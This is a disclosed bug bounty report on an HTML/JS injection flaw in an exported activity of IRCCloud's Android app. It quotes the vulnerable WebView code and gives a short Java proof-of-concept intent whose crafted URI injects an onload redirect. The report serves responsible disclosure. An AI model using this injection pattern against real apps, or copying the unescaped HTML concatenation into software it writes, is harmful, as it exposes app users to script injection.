# [IRCCloud Android] XSS in ImageViewerActivity

## Report Details
- **Report ID**: 283063
- **URL**: https://hackerone.com/reports/283063
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-10-26T12:18:33.011Z
- **Disclosed**: 2017-11-03T11:36:13.948Z

## Reporter
- **Username**: bagipro
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: irccloud

## Vulnerability Information
Hi, I'd like to report HTML/JS injection in activity ```com.irccloud.android.activity.ImageViewerActivity``` which is exported:
```xml
        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="@string/title_activity_imageviewer" android:name="com.irccloud.android.activity.ImageViewerActivity" android:theme="@style/ImageViewerTheme">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="@string/IMAGE_SCHEME"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="@string/IMAGE_SCHEME_SECURE"/>
            </intent-filter>
        </activity>
```
so can be launched by arbitrary apps installed on the same device. On the newest Androids could be exploited also by Android Instant Apps directly from a web-browser (installation is not required).

File ``` com/irccloud/android/activity/ImageViewerActivity.java  ```
```java

        } else if (getIntent() == null || getIntent().getDataString() == null) {
            finish();
        } else {
            ImageList.getInstance().fetchImageInfo(getIntent().getDataString().replace(getResources().getString(R.string.IMAGE_SCHEME), "http"), new OnImageInfoListener() {
                public void onImageInfo(ImageURLInfo info) {
                    if (info == null) {
                        ImageViewerActivity.this.fail();
                    } else if (info.mp4 != null) {
                        ImageViewerActivity.this.loadVideo(info.mp4);
                    } else {
                        ImageViewerActivity.this.loadImage(info.thumbnail); // by default
                    }
                }
            });
        }
```

Here we see that method ```ImageList.fetchImageInfo(..)``` is being loaded with attacker provided data.
Inside ``` ImageList ```:
```java
    public void fetchImageInfo(String URL, OnImageInfoListener listener) {
        // ...
        String url = URL;
        // ...
        ImageURLInfo info = new ImageURLInfo();
        info.thumbnail = url;
        info.original_url = URL;
        putImageInfo(info);
        listener.onImageInfo(info);
```
So both ```info.thumbnail``` and ```info.original_url``` contains attacker provided data and this stuff is returned back to ```ImageViewerActivity``` where code is executed
```java
ImageViewerActivity.this.loadImage(info.thumbnail);
```

Inside this method attacker can inject arbitrary HTML/JS:
```java
private void loadImage(String urlStr) {
        try {
            // ...
            this.mImage.loadDataWithBaseURL(null, "<!DOCTYPE html>\n<html><head><style>html, body, table { height: 100%; width: 100%; background-color: #000;}</style></head>\n<body>\n<table><tr><td><img src='" + new URL(urlStr).toString() + "' width='100%' onerror='Android.imageFailed()' onclick='Android.imageClicked()' style='background-color: #fff;'/>\n</td></tr></table></body>\n</html>", "text/html", "UTF-8", null);
```

PoC of exploitation on Java:
```java
        Intent intent = new Intent();
        intent.setClassName("com.irccloud.android", "com.irccloud.android.activity.ImageViewerActivity");
        intent.setData(Uri.parse("https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg' onload='window.location.href=\"http://yahoo.com\""));
        startActivity(intent);
```

Result:
{F233010}
{F233011}

APK is attached

## Attachments
- 2017-10-26_15-15-58.jpg
- 2017-10-26_15-15-26.jpg
- app-release.apk
